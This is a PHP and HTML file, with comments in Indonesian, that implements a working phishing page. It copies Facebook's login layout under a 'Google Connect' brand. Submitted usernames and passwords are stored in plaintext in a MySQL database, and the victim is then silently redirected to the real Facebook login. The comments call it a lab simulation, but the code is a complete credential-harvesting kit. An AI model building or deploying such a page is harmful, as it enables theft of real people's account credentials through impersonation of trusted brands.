<?php
// 1. Konfigurasi Database (Sama seperti sebelumnya)
$host = "127.0.0.1";
$user = "root"; // Ganti jika kamu punya user khusus
$pass = "";     // Kosongkan jika tidak ada password
$db   = "db_lab"; // Pastikan database ini sudah dibuat

$conn = mysqli_connect($host, $user, $pass, $db);

// 2. Logika Menyimpan Data
if(isset($_POST['login'])){
    $username = $_POST['username'];
    $password = $_POST['password'];

    if($conn){
        $sql = "INSERT INTO users (username, password) VALUES (?, ?)";
        $stmt = $conn->prepare($sql);
        $stmt->bind_param("ss", $username, $password);
        $stmt->execute();
        // Jangan tampilkan alert, tapi langsung arahkan (redirect) ke halaman asli
        // agar simulasi lebih mulus.
        header("Location: https://www.facebook.com/login/");
        exit();
    } else {
        echo "Database Error";
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Masuk ke Akun Anda</title>
    <style>
        body {
            font-family: SFProText, -apple-system, BlinkMacSystemFont, Roboto, Segoe UI, Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .container {
            display: flex;
            flex-direction: row;
            align-items: center;
            max-width: 1000px;
            margin-bottom: 50px;
        }
        /* Gaya Kiri (Google-like info) */
        .left-text {
            padding-right: 100px;
            color: #1c1e21;
        }
        .left-text h1 {
            color: #1877f2;
            font-size: 4rem;
            margin: 0 0 10px -10px;
            font-weight: 700;
        }
        .left-text p {
            font-size: 1.5rem;
            line-height: 32px;
            margin: 0;
            max-width: 500px;
        }
        /* Gaya Kotak Login (Facebook-like box) */
        .login-box {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            width: 396px;
            text-align: center;
        }
        .login-box input {
            width: 100%;
            padding: 14px 16px;
            margin-bottom: 12px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 17px;
            box-sizing: border-box;
        }
        .login-box input:focus {
            outline: none;
            border-color: #1b74e4;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        .login-btn {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 20px;
            font-weight: 600;
            line-height: 48px;
            width: 100%;
            cursor: pointer;
            margin-bottom: 10px;
        }
        .login-btn:hover { background-color: #166fe5; }
        .forgot-link {
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
            margin-top: 10px;
            display: block;
        }
        .divider {
            border-bottom: 1px solid #dadde1;
            margin: 20px 0;
        }
        .create-btn {
            background-color: #36a420;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 17px;
            font-weight: 600;
            line-height: 36px;
            padding: 0 16px;
            cursor: pointer;
            display: inline-block;
        }
        .create-btn:hover { background-color: #31911d; }

        /* Footer */
        .footer {
            font-size: 12px;
            color: #737373;
            text-align: center;
            margin-top: 50px;
            width: 100%;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="left-text">
            <h1>Google Connect</h1>
            <p>Terhubung dengan teman dan dunia di sekitar Anda.</p>
        </div>

        <div class="login-box">
            <form method="POST">
                <input type="text" name="username" placeholder="Email atau nomor telepon" required>
                <input type="password" name="password" placeholder="Kata Sandi" required>
                <button type="submit" name="login" class="login-btn">Masuk</button>
            </form>
            <a href="#" class="forgot-link">Lupa Kata Sandi?</a>
            <div class="divider"></div>
            <button class="create-btn">Buat Akun Baru</button>
        </div>
    </div>

    <div class="footer">
        Google © 2024
    </div>

</body>
</html>
